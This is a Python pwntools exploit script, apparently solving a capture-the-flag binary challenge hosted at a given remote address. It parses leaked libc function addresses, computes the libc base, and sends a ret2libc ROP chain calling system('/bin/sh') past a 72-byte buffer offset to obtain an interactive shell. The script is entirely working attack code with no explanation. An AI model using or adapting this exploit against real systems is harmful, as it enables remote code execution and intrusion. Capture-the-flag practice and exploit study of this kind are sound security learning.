from pwn import *

NC = "nc 167.71.212.18 60256"
HOST = NC.split(" ")[1]
PORT = NC.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *vuln+157
continue
""".format(
    **locals()
)

# Binary filename
exe = "./chall"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc6_2.34-0ubuntu1_amd64.so")

# local
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
# ld = ELF("./ld-2.27.so")


offset = 72

# Start program
io = start()

# Build the payload
io.recvuntil(b"What are you doing?\n")
fgets = int(io.recvline().decode().split(" ")[2].strip(), 16)
printf = int(io.recvline().decode().split(" ")[2].strip(), 16)
puts = int(io.recvline().decode().split(" ")[2].strip(), 16)

info("fgets: " + hex(fgets))
info("printf: " + hex(printf))
info("puts: " + hex(puts))

libc.address = fgets - libc.sym["fgets"]
info("libc address: " + hex(libc.address))
binsh = libc.search(b"/bin/sh\x00").__next__()
pop_rdi = libc.search(asm("pop rdi; ret")).__next__()
system = libc.sym["system"]
print(hex(system), hex(binsh))

# Send the payload
payload = flat({offset: [pop_rdi + 0x1, pop_rdi, binsh, system]})

io.sendline(payload)
# Got Shell?
io.interactive()
